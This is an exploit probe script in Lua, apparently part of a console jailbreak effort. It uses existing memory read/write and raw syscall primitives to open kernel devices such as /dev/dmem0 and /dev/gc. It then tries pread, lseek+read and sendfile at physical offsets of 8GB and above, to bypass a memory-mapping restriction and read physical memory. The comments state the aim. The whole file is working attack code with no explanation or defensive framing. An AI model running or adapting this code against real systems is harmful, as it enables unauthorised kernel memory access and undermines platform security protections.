-- CRASH_CLASS: LOW
-- PROBE 563i: read()/pread() on dmem0 fd — bypass d_mmap limit
--
-- 563h: dmem0 d_mmap rejects >5GB and unallocated offsets.
-- BUT: device fds can have d_read handler separate from d_mmap.
-- If dmem0 supports read(), lseek to arbitrary phys offset + read() might work.
-- Also test: pread(475) which combines seek+read atomically.
-- Also test: direct read/pread on /dev/gc, /dev/dce, /dev/dmpdev
--
-- If read works on dmem0 at 8GB+, we bypass the mmap restriction entirely.

print("=== PROBE 563i: DMEM READ+SEEK ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if not ok then return nil end
    local n = N(v); if n < 0 then n = n + 0x100000000 end; return n
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local PAGE = 0x4000
local rbuf = memory.alloc(PAGE)

local function write_str(buf, str)
    local b = N(buf)
    for i = 0, #str + 4, 4 do wd(b + i, 0) end
    for i = 0, #str - 1, 4 do
        local val = 0
        for j = 0, 3 do
            local idx = i + j + 1
            if idx <= #str then val = val + string.byte(str, idx) * (256 ^ j) end
        end
        wd(b + i, val)
    end
end
local path_buf = memory.alloc(32)

-- Helper: open device
local function dev_open(path)
    write_str(path_buf, path)
    local ok_o, fd_raw = pcall(function()
        return native.fcall_with_rax(stub, 5, path_buf, uint64(2))
    end)
    return ok_o and N(fd_raw) or -999
end

-- Helper: try read at offset (using pread=475 for atomicity)
local function try_pread(fd, offset_str, nbytes)
    -- Clear buffer
    for i = 0, nbytes - 1, 4 do wd(N(rbuf) + i, 0xEEEEEEEE) end
    -- pread(fd, buf, nbytes, offset)
    local ok_r, rv_r = pcall(function()
        return native.fcall_with_rax(stub, 475,
            uint64(fd), rbuf, uint64(nbytes), uint64(offset_str))
    end)
    local rv = ok_r and N(rv_r) or -999
    local d0 = rb(N(rbuf)) or 0xEEEEEEEE
    local d4 = rb(N(rbuf) + 4) or 0xEEEEEEEE
    return rv, d0, d4
end

-- Helper: lseek + read
local function try_lseek_read(fd, offset_str, nbytes)
    -- lseek(fd, offset, SEEK_SET=0)
    local ok_s, rv_s = pcall(function()
        return native.fcall_with_rax(stub, 478,
            uint64(fd), uint64(offset_str), uint64(0))
    end)
    local seek_rv = ok_s and N(rv_s) or -999

    for i = 0, nbytes - 1, 4 do wd(N(rbuf) + i, 0xEEEEEEEE) end
    local ok_r, rv_r = pcall(function()
        return native.fcall_with_rax(stub, 3,
            uint64(fd), rbuf, uint64(nbytes))
    end)
    local rv = ok_r and N(rv_r) or -999
    local d0 = rb(N(rbuf)) or 0xEEEEEEEE
    local d4 = rb(N(rbuf) + 4) or 0xEEEEEEEE
    return seek_rv, rv, d0, d4
end

io.flush()

-- ============================================================
-- [A] dmem0: pread at various offsets
-- ============================================================
print("[A] dmem0 pread")
local fd0 = dev_open("/dev/dmem0")
print("  fd=" .. fd0)

if fd0 >= 0 then
    local offsets = {
        {"0", "0"},
        {"0x4000", "16KB"},
        {"0x100000", "1MB"},
        {"0x10000000", "256MB"},
        {"0x100000000", "4GB"},
        {"0x140000000", "5GB"},
        {"0x150000000", "5.375GB"},
        {"0x200000000", "8GB"},
        {"0x300000000", "12GB"},
    }
    for _, entry in ipairs(offsets) do
        local rv, d0, d4 = try_pread(fd0, entry[1], 16)
        local status
        if rv > 0 then
            status = string.format("read=%d data=%08X_%08X", rv, d4, d0)
        elseif rv == 0 then
            status = "EOF"
        else
            status = string.format("rv=%d", rv)
        end
        print(string.format("  %s (%s): %s", entry[1], entry[2], status))
    end
end
io.flush()

-- ============================================================
-- [B] dmem0: lseek + read
-- ============================================================
print("")
print("[B] dmem0 lseek+read")
if fd0 >= 0 then
    local offsets = {"0", "0x100000000", "0x200000000"}
    for _, off_str in ipairs(offsets) do
        local seek_rv, read_rv, d0, d4 = try_lseek_read(fd0, off_str, 16)
        print(string.format("  %s: seek=%d read=%d data=%08X_%08X",
            off_str, seek_rv, read_rv, d4, d0))
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd0)) end)
end
io.flush()

-- ============================================================
-- [C] /dev/gc pread
-- ============================================================
print("")
print("[C] /dev/gc pread")
local fd_gc = dev_open("/dev/gc")
print("  fd=" .. fd_gc)
if fd_gc >= 0 then
    for _, off_str in ipairs({"0", "0x100000000", "0x200000000"}) do
        local rv, d0, d4 = try_pread(fd_gc, off_str, 16)
        print(string.format("  %s: rv=%d data=%08X_%08X", off_str, rv, d4, d0))
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_gc)) end)
end
io.flush()

-- ============================================================
-- [D] /dev/dce pread
-- ============================================================
print("")
print("[D] /dev/dce pread")
local fd_dce = dev_open("/dev/dce")
print("  fd=" .. fd_dce)
if fd_dce >= 0 then
    for _, off_str in ipairs({"0", "0x100000000"}) do
        local rv, d0, d4 = try_pread(fd_dce, off_str, 16)
        print(string.format("  %s: rv=%d data=%08X_%08X", off_str, rv, d4, d0))
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_dce)) end)
end
io.flush()

-- ============================================================
-- [E] /dev/dmpdev pread (might be dump device)
-- ============================================================
print("")
print("[E] /dev/dmpdev pread")
local fd_dmp = dev_open("/dev/dmpdev")
print("  fd=" .. fd_dmp)
if fd_dmp >= 0 then
    for _, off_str in ipairs({"0", "0x1000", "0x100000000"}) do
        local rv, d0, d4 = try_pread(fd_dmp, off_str, 16)
        print(string.format("  %s: rv=%d data=%08X_%08X", off_str, rv, d4, d0))
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_dmp)) end)
end
io.flush()

-- ============================================================
-- [F] /dev/rng pread (quick test)
-- ============================================================
print("")
print("[F] /dev/rng pread")
local fd_rng = dev_open("/dev/rng")
print("  fd=" .. fd_rng)
if fd_rng >= 0 then
    local rv, d0, d4 = try_pread(fd_rng, "0", 16)
    print(string.format("  rv=%d data=%08X_%08X", rv, d4, d0))
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_rng)) end)
end

-- ============================================================
-- [G] sendfile FROM dmem0 fd to socketpair
-- ============================================================
print("")
print("[G] sendfile(dmem0 → socketpair)")
local fd0b = dev_open("/dev/dmem0")
if fd0b >= 0 then
    local spbuf = memory.alloc(16)
    wq(N(spbuf), Z)
    pcall(function()
        native.fcall_with_rax(stub, 135,
            uint64(1), uint64(2), uint64(0), spbuf)
    end)
    local sp_a = rb(N(spbuf)) or -1
    local sp_b = rb(N(spbuf) + 4) or -1

    if sp_a >= 0 then
        -- sendfile(out_fd, in_fd, offset_ptr, nbytes)
        -- sys 393 = sendfile
        local off_buf = memory.alloc(8)
        wq(N(off_buf), uint64("0x200000000")) -- 8GB phys offset

        local ok_sf, rv_sf = pcall(function()
            return native.fcall_with_rax(stub, 393,
                uint64(sp_a), uint64(fd0b), off_buf, uint64(PAGE))
        end)
        local sf_rv = ok_sf and N(rv_sf) or -999
        print(string.format("  sendfile(out=%d, in=%d, off=8GB)=%d", sp_a, fd0b, sf_rv))

        if sf_rv > 0 then
            for i = 0, 12, 4 do wd(N(rbuf) + i, 0xEEEEEEEE) end
            pcall(function()
                native.fcall_with_rax(stub, 3, uint64(sp_b), rbuf, uint64(16))
            end)
            local r0 = rb(N(rbuf)) or 0
            local r4 = rb(N(rbuf) + 4) or 0
            print(string.format("  data: %08X_%08X", r4, r0))
        end

        -- Also try offset 0 (control)
        wq(N(off_buf), Z)
        local ok_sf2, rv_sf2 = pcall(function()
            return native.fcall_with_rax(stub, 393,
                uint64(sp_a), uint64(fd0b), off_buf, uint64(PAGE))
        end)
        print(string.format("  sendfile(off=0)=%d", ok_sf2 and N(rv_sf2) or -999))

        pcall(function() native.fcall_with_rax(stub, 6, uint64(sp_a)) end)
        pcall(function() native.fcall_with_rax(stub, 6, uint64(sp_b)) end)
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd0b)) end)
end

io.flush()
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 563i DONE ===")
